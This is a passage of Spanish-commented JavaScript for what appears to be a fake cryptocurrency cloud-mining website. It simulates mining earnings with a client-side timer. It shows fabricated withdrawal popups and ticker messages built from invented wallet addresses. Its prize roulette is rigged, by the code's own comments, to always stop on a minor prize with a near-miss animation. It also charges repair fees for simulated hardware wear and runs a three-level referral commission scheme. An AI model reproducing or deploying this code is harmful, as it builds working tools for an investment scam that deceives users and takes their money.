            if(user && user.isMinerRunning) {
                document.getElementById('minerActivationOverlay').style.display = 'none';
            }
            
            setInterval(() => {
                if(!user || !user.isMinerRunning) return; // Si no lo ha encendido, no suma nada

                const currentTier = tiers.find(t => t.id === user.tierId) || tiers[0];
                const coinConfig = cryptoData[user.activeCoin];
                
                // --- LÓGICA DE DESGASTE DE HARDWARE (Mecánica 6) ---
                if(user.tierId > 1 && user.minerCondition > 0) {
                    user.minerCondition -= 0.02; // Pierde eficiencia lentamente
                    if(user.minerCondition <= 0) user.minerCondition = 0;
                }

                const cortex = document.querySelector('.cortex-module');
                const btnMaint = document.getElementById('btnMaintenance');
                if(user.minerCondition <= 20 && user.tierId > 1) {
                    if(cortex) cortex.style.borderColor = 'var(--danger)';
                    if(btnMaint) btnMaint.style.display = 'block';
                } else {
                    if(cortex) cortex.style.borderColor = 'var(--rig-frame)';
                    if(btnMaint) btnMaint.style.display = 'none';
                }

                // Penalización: si llega a 0%, mina al 10% de velocidad
                let efficiency = (user.minerCondition === 0 && user.tierId > 1) ? 0.1 : 1;

                // --- LÓGICA DE BONUS ANUNCIO + RULETA ---
                let extraBoostMath = 0; 
                let displayHashExtra = "";
                
                const badge = document.getElementById('boostBadge');
                if(Date.now() < user.boostUntil) {
                    extraBoostMath = (currentTier.baseBtcPerSec / parseFloat(currentTier.hashrate)) * 1.05;
                    displayHashExtra = " + 1.05 TH/s";
                    if(badge) badge.style.display = 'inline';
                } else {
                    if(badge) badge.style.display = 'none';
                }

                // Añadir Hashrate ganado en la ruleta (permanente)
                let rouletteBoostMath = user.bonusHashrate > 0 ? (currentTier.baseBtcPerSec / parseFloat(currentTier.hashrate)) * user.bonusHashrate : 0;
                if(user.bonusHashrate > 0) {
                    displayHashExtra += ` (+${user.bonusHashrate.toFixed(2)} RULETA)`;
                }

                // Actualizar UI del Hashrate Visual
                const hashDisplay = document.getElementById('hashrateDisplay');
                if(hashDisplay) hashDisplay.innerText = currentTier.hashrate + displayHashExtra;

                // Sumatoria real con eficiencia y todos los bonos
                user.balances[user.activeCoin] += ((currentTier.baseBtcPerSec + extraBoostMath + rouletteBoostMath) * coinConfig.multiplier * efficiency);
                
                const currentBalance = user.balances[user.activeCoin];
                const currentUSD = currentBalance * coinConfig.price;

                const balEl = document.getElementById('cryptoBalance');
                const usdEl = document.getElementById('usdBalance');
                
                if(balEl) balEl.innerText = currentBalance.toFixed(10); 
                if(usdEl) usdEl.innerText = currentUSD.toLocaleString('en-US', {minimumFractionDigits: 2, maximumFractionDigits: 2});
                
                // Progreso con cálculo dinámico
                const pCur = document.getElementById('progCurrent');
                const pTar = document.getElementById('progTarget');
                const pFill = document.getElementById('progFill');
                const targetUSD = getMinWithdrawUSD(user.tierId, user.activeCoin);
                
                if(pCur) pCur.innerText = currentUSD.toFixed(2);
                if(pTar) pTar.innerText = targetUSD.toFixed(2);
                
                if(pFill) {
                    let progressPercent = (currentUSD / targetUSD) * 100;
                    if(progressPercent > 100) progressPercent = 100;
                    pFill.style.width = `${progressPercent}%`;
                }

                const balMiner = document.getElementById('balanceActiveMiner');
                if(balMiner) balMiner.innerText = currentTier.name;
                saveProgress();
            }, 1000);

            // BUCLE SVG Medidor
            setInterval(() => {
                if(!user) return;
                const currentTier = tiers.find(t => t.id === user.tierId) || tiers[0];
                const randomRot = Math.floor(Math.random() * (currentTier.needleRange[1] - currentTier.needleRange[0])) + currentTier.needleRange[0];
                const needle = document.getElementById('hMeterNeedleSvg');
                if(needle) needle.style.transform = `rotate(${randomRot - 90}deg)`;
            }, 800);
        }

      const fomoNames = ["0x4A2...8F1", "1Bz8...9Qz", "0x99D...2B4", "T9aR...5Vw", "0x11C...3E3"];
        let isFomoActive = false;
        function startFomoSystem() {
            if(isFomoActive) return;
            isFomoActive = true;
            setInterval(() => {
                if(Math.random() > 0.4) { 
                    const randomName = fomoNames[Math.floor(Math.random() * fomoNames.length)];
                    // Montos más realistas, entre $15 y $95 USD
                    const randomAmt = Math.floor(Math.random() * 80) + 15; 
                    
                    const container = document.getElementById('fomo-container');
                    if(!container) return;
                    const popup = document.createElement('div');
                    popup.className = 'fomo-popup';
                    popup.innerHTML = `<span class="fomo-icon">💸</span> <div><b>Retiro Exitoso</b><br>El usuario ${randomName} acaba de retirar $${randomAmt} USD.</div>`;
                    
                    container.appendChild(popup);
                    setTimeout(() => popup.remove(), 6000);
                }
            }, 20000);
        }

        // ==========================================
        // DUAL ANIMATION: MATRIX (Adentro) & MONEDAS (Afuera)
        // ==========================================
        const canvas = document.getElementById('matrixCanvas'); const ctx = canvas.getContext('2d');
        const canvasAuth = document.getElementById('coinsCanvasAuth'); const ctxAuth = canvasAuth.getContext('2d');
        
        let coinsArray = [];
        const coinSymbols = ['₿', 'Ł', 'Ð', 'ETH', 'USDT'];
        
        function initCoins() {
            coinsArray = [];
            for(let i=0; i<35; i++) {
                coinsArray.push({
                    x: Math.random() * window.innerWidth,
                    y: Math.random() * window.innerHeight,
                    size: Math.random() * 25 + 15,
                    speed: Math.random() * 3 + 1,
                    symbol: coinSymbols[Math.floor(Math.random() * coinSymbols.length)],
                    color: Math.random() > 0.3 ? '#f7931a' : '#94a3b8' // Oro o Plata
                });
            }
        }

        function resizeCanvas() { 
            canvas.height = window.innerHeight; canvas.width = window.innerWidth; 
            canvasAuth.height = window.innerHeight; canvasAuth.width = window.innerWidth; 
            initCoins();
        }
        window.addEventListener('resize', resizeCanvas); resizeCanvas();

        const characters = "01ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789₿@#$*+-%"; const fontSize = 14; 
        let columns = canvas.width / fontSize; let drops = Array(Math.floor(columns)).fill(1);

        function drawAnimations() {
            // Fondo Matrix Interno
            ctx.fillStyle = "rgba(3, 4, 6, 0.08)"; ctx.fillRect(0, 0, canvas.width, canvas.height);
            ctx.font = fontSize + "px monospace"; 
            const matrixColor = getComputedStyle(document.body).getPropertyValue('--matrix-color').trim();

            for (let i = 0; i < drops.length; i++) {
                const text = characters.charAt(Math.floor(Math.random() * characters.length));
                ctx.fillStyle = matrixColor; ctx.fillText(text, i * fontSize, drops[i] * fontSize);
                if (drops[i] * fontSize > canvas.height && Math.random() > 0.985) drops[i] = 0;
                drops[i]++;
            }

            // Lluvia Deslumbrante de Criptomonedas (Login)
            ctxAuth.clearRect(0, 0, canvasAuth.width, canvasAuth.height);
            for(let i=0; i<coinsArray.length; i++) {
                let c = coinsArray[i];
                ctxAuth.fillStyle = c.color;
                ctxAuth.font = `bold ${c.size}px Arial`;
                ctxAuth.shadowBlur = 20;
                ctxAuth.shadowColor = c.color;
                ctxAuth.fillText(c.symbol, c.x, c.y);
                c.y += c.speed;
                if(c.y > canvasAuth.height) {
                    c.y = -40;
                    c.x = Math.random() * canvasAuth.width;
                }
            }
        }
        
        setInterval(drawAnimations, 50);

       // --- FUNCIONES EXTRA (CALCULADORA DINÁMICA, RULETA TRUCADA, TICKER, REFERIDOS) ---
      
function openReferrals() {
            if(!user) return;
            const uidStr = user.idUsuario || (user.uid ? user.uid.slice(0,8).toUpperCase() : "102938");
            document.getElementById('refUserIdDisplay').innerText = uidStr;
            
            // Genera el enlace de referidos de forma dinámica basándose en la URL actual de tu servidor
            const baseUrl = window.location.origin + window.location.pathname;
            document.getElementById('refLinkInput').value = `${baseUrl}?ref=${uidStr}`;
            
            if(!user.referrals) {
                user.referrals = { lvl1: 0, lvl2: 0, lvl3: 0, earn1: 0, earn2: 0, earn3: 0 };
            }

            document.getElementById('refCount1').innerText = user.referrals.lvl1;
            document.getElementById('refCount2').innerText = user.referrals.lvl2;
            document.getElementById('refCount3').innerText = user.referrals.lvl3;
            
            document.getElementById('refEarn1').innerText = `+$${user.referrals.earn1.toFixed(2)}`;
            document.getElementById('refEarn2').innerText = `+$${user.referrals.earn2.toFixed(2)}`;
            document.getElementById('refEarn3').innerText = `+$${user.referrals.earn3.toFixed(2)}`;

            const total = user.referrals.earn1 + user.referrals.earn2 + user.referrals.earn3;
            document.getElementById('refTotalEarn').innerText = `$${total.toFixed(2)} USD`;

            document.getElementById('referralModal').style.display = 'flex';
        }

        function copyRefLink() {
            const copyText = document.getElementById("refLinkInput");
            copyText.select();
            copyText.setSelectionRange(0, 99999); 
            document.execCommand("copy");
            showToast("✅ <b>Enlace Copiado</b><br>Compártelo en tus redes sociales para ganar comisiones de red.");
        }

        function updateCalculator() {
            if(!user) return;
            const currentTier = tiers.find(t => t.id === user.tierId) || tiers[0];
            const coinPrice = cryptoData['BTC'].price; // Usamos BTC como ancla para calcular el ROI
            
            // Calculo exacto de lo que genera el minero
            const dailyBtc = currentTier.baseBtcPerSec * 86400; // 60 * 60 * 24 = 86400 segundos al día
            const dailyUSD = dailyBtc * coinPrice;
            const monthlyUSD = dailyUSD * 30;

            document.getElementById('calcMinerName').innerText = currentTier.name;
            document.getElementById('calcCost').innerText = `$${currentTier.costUSD.toFixed(2)}`;
            document.getElementById('calcEarnDaily').innerText = `$${dailyUSD.toFixed(2)}`;
            document.getElementById('calcEarn30').innerText = `$${monthlyUSD.toFixed(2)}`;
            
            const roiDays = currentTier.costUSD > 0 ? Math.ceil(currentTier.costUSD / dailyUSD) : "Infinito";
            const roiColor = roiDays <= 30 ? 'var(--success)' : 'var(--danger)';
            
            const roiEl = document.getElementById('calcRoi');
            roiEl.innerText = currentTier.costUSD === 0 ? "Largo Plazo" : `${roiDays} Días`;
            roiEl.style.color = currentTier.costUSD === 0 ? 'var(--warning)' : roiColor;
        }

        // Se inyecta la actualización del calculador cuando se activa un nuevo minero
        const originalActivateTier = activateTier;
        activateTier = function(tierId) {
            originalActivateTier(tierId);
            updateCalculator();
        };
function openRoulette() {
            const now = Date.now();
            // 7200000 ms equivale exactamente a 2 horas
            if(now - user.lastSpinDate < 7200000) { 
                const msLeft = 7200000 - (now - user.lastSpinDate);
                const hoursLeft = Math.floor(msLeft / 3600000);
                const minsLeft = Math.ceil((msLeft % 3600000) / 60000);
                showToast(`⏳ Vuelve en ${hoursLeft}h y ${minsLeft}m para tu próximo giro gratis.`);
                return;
            }
            const btn = document.getElementById('btnSpin');
            if(btn) {
                btn.disabled = false;
                btn.innerText = "TIRAR DE LA RULETA";
            }
            document.getElementById('rouletteModal').style.display = 'flex';
        }

        function spinRoulette() {
            const wheel = document.getElementById('rouletteWheel');
            const btn = document.getElementById('btnSpin');
            if(btn) {
                btn.disabled = true;
                btn.innerText = "GIRANDO...";
            }

            // LÓGICA DE CASINO: Trucada para que visualmente pase rasando el premio de $1000
            // El premio de $1000 está entre 240 y 300 grados.
            // Haremos que la ruleta gire 6 vueltas completas (2160 grados) 
            // Y se detenga en 345 grados (Justo en el premio menor de +0.05 TH/s)
            
            const stopAngle = 330; // Apunta a la zona verde de +0.05
            const totalDeg = (360 * 6) + stopAngle; 

            // Curva bezier para que frene dramáticamente rozando el premio grande
            wheel.style.transition = 'transform 5s cubic-bezier(0.2, 0.8, 0.3, 1)';
            wheel.style.transform = `rotate(${totalDeg}deg)`;
            
            setTimeout(() => {
                user.bonusHashrate += 0.05; 
                user.lastSpinDate = Date.now();
                saveProgress();
                document.getElementById('rouletteModal').style.display = 'none';
                
                // Mensaje con psicología de "Casi ganas"
                showToast('🎰 <b>¡Por poco ganas el JackPot!</b><br>Como consuelo has ganado +0.05 TH/s extra permanentes.');
                
                wheel.style.transition = 'none'; 
                wheel.style.transform = `rotate(0deg)`;
            }, 5200);
        }

        function repairMiner() {
            const repairCost = 2; // $2 USD
            const currentUSD = user.balances[user.activeCoin] * cryptoData[user.activeCoin].price;
            if(currentUSD < repairCost) {
                showToast(`⚠️ Necesitas al menos $2.00 USD minados para hacer mantenimiento.`);
                return;
            }
            user.balances[user.activeCoin] -= (repairCost / cryptoData[user.activeCoin].price);
            user.minerCondition = 100;
            saveProgress();
            showToast('🔧 <b>Mantenimiento Completado</b><br>Tu minero vuelve a operar a su máxima capacidad.');
        }

        function triggerMoneyRain() {
            const rc = document.getElementById('moneyRainContainer');
            if(!rc) return;
            rc.style.display = 'block';
            for(let i=0; i<60; i++) {
                const m = document.createElement('div');
                m.className = 'money-drop';
                m.innerText = '💸';
                m.style.left = Math.random() * 100 + 'vw';
                m.style.animationDuration = (Math.random() * 2 + 2) + 's';
                m.style.animationDelay = (Math.random() * 1.5) + 's';
                rc.appendChild(m);
            }
            setTimeout(() => { rc.innerHTML = ''; rc.style.display = 'none'; }, 5000);
        }

        // Actualizamos la función de retiros para que tire la lluvia
        const originalVerify2FA = verify2FA;
        verify2FA = function() {
            // Llama a la original, que comprueba el T2FA y aprueba
            originalVerify2FA();
            // Dispara la lluvia si se procesó el retiro (la ventana modal se cierra)
            setTimeout(() => {
                if(document.getElementById('tfaArea').style.display === 'none' || document.getElementById('paymentOverlay').style.display === 'none') {
                    triggerMoneyRain();
                }
            }, 500);
        };

       function startTicker() {
            const names = ["0x8A2...9B1", "1Cx7...4Fz", "T4aW...1Yq", "0x91D...3A2", "bc1q...m9pz"];
            const plans = ["ProMiner X", "AntCluster 1200", "Quantum H-Core"];
            setInterval(() => {
                const t = document.getElementById('socialTicker');
                if(!t) return;
                const rName = names[Math.floor(Math.random() * names.length)];
                const rPlan = plans[Math.floor(Math.random() * plans.length)];
                // Retiros en el Ticker ajustados para no pasar de $100 (entre $15 y $95)
                const action = Math.random() > 0.5 ? `acaba de adquirir el plan <b>${rPlan}</b>` : `ha retirado <b>$${Math.floor(Math.random()*80)+15} USD</b> a su billetera`;
                t.innerHTML = `Usuario ${rName} ${action}.`;
            }, 8000);
        }

        // Activamos el ticker
        startTicker();

        // Si NO detectamos el modo de firebase (por error de config), iniciamos directo
        if(!isFirebaseActive) {
            console.log("Firebase apagado, esperando login mock");
        }
    </script>
